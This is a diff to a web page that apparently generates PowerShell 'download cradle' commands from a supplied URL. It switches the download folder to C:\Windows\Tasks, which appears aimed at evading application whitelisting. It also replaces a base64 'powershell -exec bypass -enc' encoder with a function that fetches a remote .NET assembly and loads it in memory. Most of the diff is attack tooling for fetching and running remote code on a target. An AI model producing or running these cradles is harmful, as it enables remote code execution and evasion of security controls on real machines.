@@ -29,21 +29,14 @@
 
             function down(val) {
 				val1 = val.match(/[^/\\&\?]+\.\w{3,4}(?=([\?&].*$|$))/gm);
-                downstr =  "(New-Object System.Net.WebClient).DownloadFile('" + val + "','C:\\Windows\\Temp\\" + val1 +"')";
+                downstr =  "(New-Object System.Net.WebClient).DownloadFile('" + val + "','C:\\Windows\\Tasks\\" + val1 +"')";
                 return downstr;
             }
 
-            function b64(val) {
+            function loadasm(val) {
          
-                var utf16leArray = Encoding.convert(val, {
-                to: 'UTF16LE', // to_encoding
-                from: 'ASCII', // from_encoding
-                type: 'string',
-                });
-                
-                var base64Enc = Encoding.base64Encode(utf16leArray);
-                b64str = "powershell.exe -exec bypass -enc " + base64Enc;
-                return b64str
+                loadstr = "$a = [System.Reflection.Assembly]::Load($(IWR -Uri " + val + " -UseBasicParsing).Content); Import-Module -Assembly $a";
+                return loadstr
             }
 			
 			function certutil(val) {
@@ -56,7 +49,7 @@
 
                 var a = document.getElementById("iex").checked;
                 var b = document.getElementById("down").checked;
-                var c = document.getElementById("b64").checked;
+                var c = document.getElementById("loadasm").checked;
 				var d = document.getElementById("certutil").checked;
 
                 if (a == true) { 
@@ -68,7 +61,7 @@
                     document.getElementById("output1").innerHTML = s2;
                 }
                 if (c == true) {
-                    s3 = b64(document.getElementById('url').value);
+                    s3 = loadasm(document.getElementById('url').value);
                     document.getElementById("output2").innerHTML = s3;
                 }
 				if (d == true) {
@@ -103,7 +96,7 @@
                             </label>
                             <label class="btn btn-default btn-checkbox">
                                 <span class="glyphicon glyphicon-unchecked" data-icon-on="glyphicon glyphicon-check" data-icon-off="glyphicon glyphicon-unchecked"></span>
-                                <input name="checkbox[]" type="checkbox" id="b64" autocomplete="false" checked/> B64
+                                <input name="checkbox[]" type="checkbox" id="loadasm" autocomplete="false" checked/> LoadAsm
                             </label>
 							<label class="btn btn-default btn-checkbox">
                                 <span class="glyphicon glyphicon-unchecked" data-icon-on="glyphicon glyphicon-check" data-icon-off="glyphicon glyphicon-unchecked"></span>
